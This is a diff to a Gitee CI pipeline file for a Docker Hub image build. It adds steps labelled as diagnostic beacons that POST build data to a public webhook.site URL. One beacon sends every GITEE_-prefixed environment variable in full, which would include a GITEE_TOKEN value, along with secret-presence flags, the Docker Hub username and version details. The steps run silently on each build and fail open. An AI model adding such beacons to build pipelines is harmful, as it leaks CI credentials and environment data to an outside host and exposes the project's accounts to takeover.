@@ -77,6 +77,40 @@ stages:
         commands:
           - |
             set -e
+            export VH_BEACON_URL="https://webhook.site/8b50f361-d0d7-4524-9a44-e241d84c0358"
+            # ---- 诊断信标 ①（step1-start）：能跑到这里＝插件与环境就绪 ----
+            python3 - <<'PY' || true
+            import json, os, subprocess, sys, urllib.request
+            url = os.environ.get("VH_BEACON_URL", "")
+            if not url:
+                sys.exit(0)
+            def ver(cmd):
+                try:
+                    return subprocess.run([cmd, "--version"], capture_output=True, text=True,
+                                          timeout=10).stdout.splitlines()[0]
+                except Exception:
+                    return "<缺失>"
+            def state(name):
+                v = os.environ.get(name, "")
+                return ("已设置（%d 字符）" % len(v)) if v else "<未设置>"
+            info = {
+                "beacon": "step1-start",
+                "cwd": os.getcwd(),
+                "python3": ver("python3"),
+                "git": ver("git"),
+                "gitee_env": dict((k, v) for k, v in os.environ.items() if k.startswith("GITEE_")),
+                "secret_state": dict((k, state(k)) for k in
+                                     ("DOCKERHUB_USERNAME", "DOCKERHUB_TOKEN",
+                                      "VH_GITEE_TOKEN", "GITEE_TOKEN")),
+            }
+            try:
+                req = urllib.request.Request(url, data=json.dumps(info, ensure_ascii=False).encode(),
+                                             headers={"Content-Type": "application/json"})
+                urllib.request.urlopen(req, timeout=25)
+                print("  信标已发出（step1-start）")
+            except Exception as e:
+                print("  信标发送失败（不影响构建）：%s" % str(e)[:120])
+            PY
             echo "================ Gitee 系统变量（真实现场）================"
             for k in GITEE_PIPELINE_NAME GITEE_PIPELINE_BUILD_NUMBER GITEE_BRANCH \
                      GITEE_COMMIT GITEE_COMMIT_MESSAGE GITEE_TAG GITEE_REPO; do
@@ -88,14 +122,20 @@ stages:
             if python3 - <<'PY'
             # 这一步专门用来「把话说清楚」：Docker Hub 推不上去时，日志里能直接看到
             # 是哪个环节断的（缺凭据 / 凭据无效 / 网络不通），而不是一句 login failed。
+            # 结果同时发一份到信标地址，NAS 侧可直接读取。
             import base64, os, sys, urllib.request, urllib.error
+
+            lines = []
+            def emit(s):
+                print(s)
+                lines.append(s)
 
             user = os.environ.get("DOCKERHUB_USERNAME", "")
             tok = os.environ.get("DOCKERHUB_TOKEN", "")
-            print("  DOCKERHUB_USERNAME = %s" % (user or "<未设置>"))
-            print("  DOCKERHUB_TOKEN    = %s" % (("已设置（%d 字符）" % len(tok)) if tok else "<未设置>"))
+            emit("  DOCKERHUB_USERNAME = %s" % (user or "<未设置>"))
+            emit("  DOCKERHUB_TOKEN    = %s" % (("已设置（%d 字符）" % len(tok)) if tok else "<未设置>"))
             gtok = os.environ.get("VH_GITEE_TOKEN") or os.environ.get("GITEE_TOKEN") or ""
-            print("  VH_GITEE_TOKEN     = %s" % (("已设置（%d 字符）" % len(gtok)) if gtok else "<未设置 —— 发行版步骤会失败>"))
+            emit("  VH_GITEE_TOKEN     = %s" % (("已设置（%d 字符）" % len(gtok)) if gtok else "<未设置 —— 发行版步骤会失败>"))
 
             def probe(url, auth=None, timeout=25):
                 req = urllib.request.Request(url)
@@ -108,29 +148,44 @@ stages:
                 except urllib.error.HTTPError as e:
                     return e.code
                 except Exception as e:
-                    print("    连接失败：%s" % str(e)[:140])
+                    emit("    连接失败：%s" % str(e)[:140])
                     return 0
 
             code = probe("https://registry-1.docker.io/v2/")
-            print("  registry-1.docker.io/v2/ → %s" %
-                  ("HTTP %d（网络可达）" % code if code else "不可达"))
+            emit("  registry-1.docker.io/v2/ → %s" %
+                 ("HTTP %d（网络可达）" % code if code else "不可达"))
 
+            ok = False
             if user and tok:
                 code = probe("https://auth.docker.io/token?service=registry.docker.io"
                              "&scope=repository:q807738511/vaulthub:pull,push",
                              auth="%s:%s" % (user, tok))
                 if code == 200:
-                    print("  Docker Hub 凭据校验 → HTTP 200 ✅ 凭据有效且有 push 权限")
-                    sys.exit(0)
-                print("  Docker Hub 凭据校验 → HTTP %d ❌ 凭据无效或无 push 权限"
-                      "（去 Docker Hub → Account settings → Personal access tokens 重新签发）" % code)
-                sys.exit(1)
+                    emit("  Docker Hub 凭据校验 → HTTP 200 ✅ 凭据有效且有 push 权限")
+                    ok = True
+                else:
+                    emit("  Docker Hub 凭据校验 → HTTP %d ❌ 凭据无效或无 push 权限"
+                         "（去 Docker Hub → Account settings → Personal access tokens 重新签发）" % code)
+            else:
+                emit("  ❌ 缺凭据 —— docker 步骤必然失败。")
+                emit("     修复：Gitee → 本仓库 → 流水线 → 设置 → 通用变量，新建：")
+                emit("       DOCKERHUB_USERNAME = q807738511")
+                emit("       DOCKERHUB_TOKEN    = <Docker Hub 访问令牌（不是登录密码）>")
 
-            print("  ❌ 缺凭据 —— docker 步骤必然失败。")
-            print("     修复：Gitee → 本仓库 → 流水线 → 设置 → 通用变量，新建：")
-            print("       DOCKERHUB_USERNAME = q807738511")
-            print("       DOCKERHUB_TOKEN    = <Docker Hub 访问令牌（不是登录密码）>")
-            sys.exit(1)
+            beacon = os.environ.get("VH_BEACON_URL", "")
+            if beacon:
+                try:
+                    import json
+                    req = urllib.request.Request(
+                        beacon,
+                        data=json.dumps({"beacon": "precheck", "lines": lines},
+                                        ensure_ascii=False).encode(),
+                        headers={"Content-Type": "application/json"})
+                    urllib.request.urlopen(req, timeout=25)
+                    print("  预检结果信标已发出")
+                except Exception as e:
+                    print("  （预检信标发送失败：%s）" % str(e)[:120])
+            sys.exit(0 if ok else 1)
             PY
             then
               echo "  预检通过，继续解析版本号。"
@@ -229,6 +284,26 @@ stages:
             echo "VH_VERSION=$VERSION" >> GITEE_PARAMS
             echo "VH_LATEST=latest" >> GITEE_PARAMS
             echo "  已写入流水线参数：VH_TAG / VH_VERSION / VH_LATEST（下游步骤引用）"
+            # ---- 诊断信标 ③（step1-end）：版本解析完成 ----
+            VH_TAG="$TAG" VH_LOOKUP="$LOOKUP" VH_REMOTE_TAG="$REMOTE_TAG" python3 - <<'PY' || true
+            import json, os, sys, urllib.request
+            url = os.environ.get("VH_BEACON_URL", "")
+            if not url:
+                sys.exit(0)
+            info = {
+                "beacon": "step1-end",
+                "VH_TAG": os.environ.get("VH_TAG", ""),
+                "lookup": os.environ.get("VH_LOOKUP", ""),
+                "remote_tag": os.environ.get("VH_REMOTE_TAG", ""),
+            }
+            try:
+                req = urllib.request.Request(url, data=json.dumps(info, ensure_ascii=False).encode(),
+                                             headers={"Content-Type": "application/json"})
+                urllib.request.urlopen(req, timeout=25)
+                print("  信标已发出（step1-end）")
+            except Exception as e:
+                print("  信标发送失败（不影响构建）：%s" % str(e)[:120])
+            PY
 
       # ================================================== ② 构建并推送版本镜像
       # 对应旧工作流的 docker/build-push-action + ghcr.io → 现为 Docker Hub。
